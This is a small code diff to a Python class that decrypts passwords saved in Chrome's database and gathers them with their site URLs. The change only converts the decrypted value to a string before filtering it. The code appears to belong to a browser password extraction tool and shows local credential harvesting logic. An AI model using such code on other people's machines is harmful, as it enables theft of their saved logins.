@@ -113,7 +113,7 @@ class Chrome:
         data = {'data': []}
         for result in cursor.fetchall():
             _passwd = self.chrome_os.decrypt_func(result[2])
-            passwd = ''.join(i for i in _passwd if i in string.printable)
+            passwd = ''.join(i for i in str(_passwd) if i in string.printable)
             if result[1] or passwd:
                 _data = {}
                 _data['url'] = result[0]
